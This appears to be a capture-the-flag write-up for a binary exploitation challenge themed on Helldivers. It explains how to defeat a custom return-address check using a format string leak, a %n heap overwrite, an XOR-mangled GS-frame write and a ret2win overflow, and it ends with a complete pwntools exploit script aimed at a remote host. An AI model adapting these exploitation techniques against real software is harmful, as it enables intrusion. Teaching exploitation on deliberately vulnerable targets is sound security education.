# HELLDIVERS

## Prompt

```
Helldiver! The automaton slaughter of Super Earth's citizens on Malevelon Creek is no more. But the fight continues on - and the surefire path to peace... is war.
Show them liberty's might, helldiver, with Super Earth's banner.
```

## TLDR

Players are expected to circumvent the stack protection mechanism in menu() to allow a buffer overflow and ret2win.
They must do the following:

1. Recognize the format string vuln in menu()
2. Leak PIE and determine PIE base.
3. Observe that both the value stored at the heap address and the real return pointer of menu() can be modified 
   from within menu(), but the gs frame value cannot.
4. Write the address of a RET gadget to the heap address using %n specifier, 
5. Observe that there is an arbitrary gs frame overwrite in deployObjective()
    4.1. menu's return address is stored in the same place predictably.
         So the player doesn't need to know the gsbase, they just need to know the expected relative position.
    4.2. Demangle the pointer to get the gsbase by xoring the address again with the mangle value, then
         add 8 bytes to the resulting address to get menu's position.

         Ex: (in gdb)
            mangle value = 0x1337                                                   | [this is visible in disass]
            gsbase  = 0x7ffff7fc2000 -> 0x7ffff7de06ca (__libc_start_call_main+122) | [this is not visible, generated at runtime]

            Mangled gsbase = 0x7ffff7fc2000 ^ 0x1337 = 0x7ffff7fc3337

            So we know that the gsbase is being mangled by 0x1337, and that the return address of menu() is stored in the next
            8 byte offset of gsbase, so:

            Unmangle the gsbase
                0x7ffff7fc3337 ^ (0x1337+0x8) = 0x7ffff7fc2008 -> 0x5555555555b0
                
            Now menu's return address is targeted by the function for overwrite.

Then:
6. Go to deployObjective(), demangle the gsbase address, and overwrite the gs frame value with the ret gadget address. Then return to the menu(),
7. Buffer overflow to change the return pointer to the ret gadget + address to superearthflag()


## Solution

There are a few interesting things to see in the main run loop function.

1. A function call to __secure() at the top of the function
```
00001666  int64_t menu()
00001672      int64_t* rax = secure(__return_addr)
```
2. Uncontrolled buffer input with gets() shortly after the menu text appears
```
0000167e      int64_t var_88
0000167e      __builtin_memset(s: &var_88, c: 0, n: 0x78)
000016fb      while (true)
000016fb          loadHeader()
0000170c          gets(buf: &var_88)
```
3. A format string vulnerability
```
00001769          puts(str: "Deploying stratagem:")
0000177a          printf(format: &var_88)
```

4. There are 5 checks to match input, but the fifth calls a 'deployObjective()' function.

5. Another gets() to the aforementioned buffer, followed by a 'validate(__return_addr, var)' function call at the very end.
```
00001735      puts(str: "You have been a stalwart line of…")
00001744      puts(str: "Any words for the aspiring young…")
00001755      gets(buf: &var_88)
00001874      validate(__return_addr, rax)
```

Trying out the first 4 options will play fun videos in the terminal, but nothing useful.
Our first instinct is to try a buffer overflow. However, regardless of what kind of ROP technique you try the program will respond with:
```
\-\-\ TREASON DETECTED /-/-/
```

Looking into the binary shows this is comes from the validate() function:

```
000012d4  int64_t validate(int64_t arg1, int64_t* arg2)

000012e4      int64_t var_10 = 0
000012ec      int32_t gsbase[0x2]
000012ec      uint64_t r12 = _readgsbase_u32(gsbase)
00001315      while (*(r12 + ((var_10 + 1) << 3)) != 0)
00001317          var_10 = var_10 + 1
00001346      if (arg1 == *(r12 + (var_10 << 3)) && arg1 == *arg2)
0000135b          *(r12 + (var_10 << 3)) = 0
00001369          free(mem: arg2)
0000138f          return 0
0000137f      puts(str: "\-\-\ TREASON DETECTED /-/-/")
00001389      exit(status: 1)
```

Lets clarify some things. Easily enough, there is a free() call on arg2 suggesting that the variable is a heap address. We also know from earlier that arg1 is the return address of the calling function.
The if statement checks if the value stored in the heap address equals the return address argument. This means whatever *(r12 + (var_10 << 3) is must also store
the return address. Looking at the start shows r12 = _readgsbase_32(). A quick search will show you that this is loading the base address of the GS frame.

This is crucial to solving the challenge. Here are the big takeaways:
1. The current calling function's return pointer is being manually checked.
2. The heap contains a copy of the return pointer.
3. The GS frame contains a copy of the return pointer.
4. All three are checked if they are the same value

This means that before attempting to return from menu(), the program checks if the return pointer has been tampered. This makes it apparent as a canary-type challenge.

We can't magically make #1 stop happening, so lets focus on #2. 
We already saw the heap address is passed as an argument to validate(). Finding it in menu shows it is the value returned by secure(). This means that looking into secure() might be worth a look (and it absolutely wouldn't hurt), but to be frank we probably don't need to care how the address is generated for now. What we do know is that it is the first 8-byte variable on the stack. This means the heap address is stored at rbp-8 which, funnily enough, is where a typical canary value would be placed.

```
00001666  int64_t menu()
00001672      int64_t* rax = secure(__return_addr)
...
00001874      validate(__return_addr, rax)
0000187b      return 0
```

Currently, our only tool at the moment is the format string vulnerability. An overflow will only let us change the pointer itself, but not the contents. 
We can write to an address using a %n string specifier, so we have overwrite to the value stored on the heap. Nice! Since the program is in a loop, we can use a %p format leak to get the heap address, and then %n to write to it.

```
# Get leak of heap
p.recvuntil(b'>>> \n')
p.sendline(bytes(f'%{offset}$p', 'utf-8'))
# pause()
p.recvline()
heap = int(p.recvline().decode('utf-8').strip(), 16)
print("Heap leak: ", hex(heap))
heap_payload = fmtstr_payload(6, {heap: superearthflag}, write_size='short')

# Now send heap overwrite
p.recvuntil(b'>>> \n')
p.sendline(heap_payload)
```

This is great, but we need to write something to it. The binary has a function superearthflag() that prints out our flag, so lets target that.
Nice argument, unfortunately:  ~~⬆ ➡ ⬇ ⬇ ⬇~~    PIE is enabled:
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found   <---- lol 
    NX:       NX enabled
    PIE:      PIE enabled
```

If you haven't already, you will want to patch out the lines in the loadHeader() function that run the intro animation. It won't affect the solvability, but it will get in the way of gdb.
With that in mind, stepping to the point just before where printf() calls our specifier, you will see that there are two addresses on the stack that start with 0x5. The first is our heap address, and the second (the return address) will point to main+34. We could manually get the format string offset, or you could use a function similar to this to leak every offset until the second instance of an address starting with 0x5 appears:

```
# Dynamically leak addresses until offset of PIE address
def find_PIE():
    count = 0
    for i in range(14,30):
        try:
            p = start()
            #
            # Find main
            #
            print(f"Trying index {i}:")
            p.recvuntil(b'>>> \n', timeout=2)
            p.sendline(bytes(f'%{i}$p', 'utf-8'))
            p.recvline()
            line = p.recvline(10)
            print(f"Result: {line}")
            if b"0x5" in line:   # We know its the second one ending in 0x5
                if count == 1:
                    print("LEAK:", line)
                    return i
                    break
                count += 1
            
            p.close()
        except:
            log.warn("Crash")
            p.close()
```

Once you find the offset is 23, you can format string leak the return address and get the PIE base:

```
offset = 23
p.recvuntil(b'>>> \n')
p.sendline(bytes(f'%{offset}$p', 'utf-8'))
# pause()
p.recvline()
leak = int(p.recvline().decode('utf-8').strip(), 16)-34        # This leak is of (main+34), so subtract 34
print("PIE leak: ", hex(leak))
print("PIE base: ", hex(leak - e.sym['main']))

e.address = leak - e.sym['main']
```

Now we can get to work.
So far we addressed two things:
1. We can overwrite the return address of menu() with any address we want (and bypass PIE)
2. We can overwrite the return address of menu() stored on the heap

The last step is the gsbase. Menu() doesn't have any mention of it here and gsbase is not loaded on this stack to leak.
Lets look into deployObjective(), without the puts() and sleep() calls for clarity:
```
0000187c  int64_t deployObjective()

00001888      int64_t* rax = secure(__return_addr)
00001894      int64_t buf = 0
000018ab      int32_t gsbase[0x2]
000018ab      uint64_t r12 = _readgsbase_u32(gsbase)
000018de      uint64_t rax_5 = r12 ^ zx.q(supermangler)
0000190f      read(fd: 0, buf: &buf, nbytes: 8)
0000191f      uint64_t rax_8 = rax_5 ^ zx.q(buf.w)
0000195f      read(fd: 0, buf: &buf, nbytes: 8)
0000196c      *rax_8 = buf
...
```
There's gsbase! It is loaded into a variable and then XOR'd with a global called 'supermangler' very subtle, huh.
'supermangler' appears store 0x1337, so the first 2 bytes of the address are mangled with this value.
Then the function allows us to write to a buffer, and then it uses that buffer to XOR the address again.
Afterwards, we read to the address.

Since the mangler is an XOR, we can provide a value that simply undoes the original XOR but also 'adds' an offset to the original address.
Since the address was the gsbase, we can point to any offset of the GS frame. But which one do we target?

You could look in the secure() function to see how the GS frame and heap structures are built and organized, or remember how the validate() function checks those.

```
000012e4      int64_t var_10 = 0
000012ec      int32_t gsbase[0x2]
000012ec      uint64_t r12 = _readgsbase_u32(gsbase)
00001315      while (*(r12 + ((var_10 + 1) << 3)) != 0)
00001317          var_10 = var_10 + 1
00001346      if (arg1 == *(r12 + (var_10 << 3)) && arg1 == *arg2)
0000135b          *(r12 + (var_10 << 3)) = 0
00001369          free(mem: arg2)
```

Here the interior of the while loop "*(r12 + ((var_10 + 1) << 3)" suggests that the gsbase is being iterated through, and then "!= 0" checks if it contains nothing.
Then the if statement uses the last index to compare. This suggests the gsbase is structured like a list of items. Considering that main(), menu(), and deployObjective() all have the secure and validate functions it could be assumed that each index stored the return address of the respective function, FILO.

Thus if we want to modify menu()'s return address, it would be the second item of the GS frame as it is the second function to be called (and not returned).
Thus we can demangle and add 0x8 to our address, and provide the bytes to our target address:

```
#Looking into deployObjective, we need to unmangle the pointer

p.recvuntil(b'>>> \n')
p.sendline(bytes('⬇ ⬆ ⬇ ⬆', 'utf-8'))
p.recvuntil(b"today?\n")
p.send(p64(0x1337+0x8))
p.recvuntil(b"credentials:\n")
p.send(p64(superearthflag))
```

Now both the heap and gs frame are satisfied, lets try an overflow. Remember to replace the address to the heap with itself at rbp-8.

```
p.recvuntil(b'>>> \n')
p.sendline(b'Quit\00')

p.recvline()
p.recvline()

chain =  b'N'*120                   # Enter 'quit'
chain += p64(heap)                  # Validation expects a pointer to the heap
chain += b'N'*8
chain += p64(superearthflag_addr)              # Overwrite main's return pointer
```

But if we try to run this, the program closes as it tries printing the flag. Stepping through with gdb shows a movaps error (the stack is misaligned).
We can fix this by using a ret gadget. Remember that only the return address (rbp+8) is validated. So instead of overwriting our three locations with 'superearthflag' we overwrite with the ret gadget's address. Then we can chain into superearthflag().

```
p.recvuntil(b'>>> \n')
p.sendline(b'Quit\00')

p.recvline()
p.recvline()

chain =  b'N'*120                   # Enter 'quit'
chain += p64(heap)                  # Validation expects a pointer to the heap
chain += b'N'*8
chain += p64(ret)                   # We got a movaps, so we have to set the return pointer to a ret gadget
chain += p64(superearthflag_addr)              # Overwrite main's return pointer

p.sendline(chain)
```

And this will get you your flag. Have fun!


## Script

```
#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(args.BIN)

gs = '''
b *validate
'''

if args.LIBC:
    libc = ELF(args.LIBC)
else:
    libc = e.libc

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("172.105.155.54", 6666)
    else:
        return process(e.path)

# Dynamically leak addresses until offset of PIE address
def find_PIE():
    count = 0
    for i in range(14,30):
        try:
            p = start()
            #
            # Find main
            #
            print(f"Trying index {i}:")
            p.recvuntil(b'>>> \n', timeout=2)
            p.sendline(bytes(f'%{i}$p', 'utf-8'))
            p.recvline()
            line = p.recvline(10)
            print(f"Result: {line}")
            if b"0x5" in line:   # We know its the second one ending in 0x5
                if count == 1:
                    print("LEAK:", line)
                    return i
                    break
                count += 1
            
            p.close()
        except:
            log.warn("Crash")
            p.close()

r = ROP(e)

p = start()

# # Defeat PIE by leaking address of main off stack
# offset = find_PIE()

offset = 23
p.recvuntil(b'>>> \n')
p.sendline(bytes(f'%{offset}$p', 'utf-8'))
# pause()
p.recvline()
leak = int(p.recvline().decode('utf-8').strip(), 16)-34        # This leak is of (main+34), so subtract 34
print("PIE leak: ", hex(leak))
print("PIE base: ", hex(leak - e.sym['main']))

e.address = leak - e.sym['main']

# Now get the address of superearthflag
superearthflag_addr = e.sym['superearthflag']
ret = e.address + r.find_gadget(["ret"])[0]
# Leak heap address
# Since main leak was at rbp+8, we our heap address at rbp-8 will be 2 offsets back
offset = offset-2

# Get leak of heap
p.recvuntil(b'>>> \n')
p.sendline(bytes(f'%{offset}$p', 'utf-8'))
# pause()
p.recvline()
heap = int(p.recvline().decode('utf-8').strip(), 16)
print("Heap leak: ", hex(heap))
heap_payload = fmtstr_payload(6, {heap: ret}, write_size='short')

# Now send heap overwrite
p.recvuntil(b'>>> \n')
p.sendline(heap_payload)
#Looking into deployObjective, we need to unmangle the pointer


p.recvuntil(b'>>> \n')
p.sendline(bytes('⬇ ⬆ ⬇ ⬆', 'utf-8'))
p.recvuntil(b"today?\n")
p.send(p64(0x1337+0x8))
p.recvuntil(b"credentials:\n")
p.send(p64(ret))


p.recvuntil(b'>>> \n')
p.sendline(b'Quit\00')

p.recvline()
p.recvline()

chain =  b'N'*120                   # Enter 'quit'
chain += p64(heap)                  # Validation expects a pointer to the heap
chain += b'N'*8
chain += p64(ret)                   # We got a movaps, so we have to set the return pointer to a ret gadget
chain += p64(superearthflag_addr)              # Overwrite main's return pointer

p.sendline(chain)

p.interactive()
```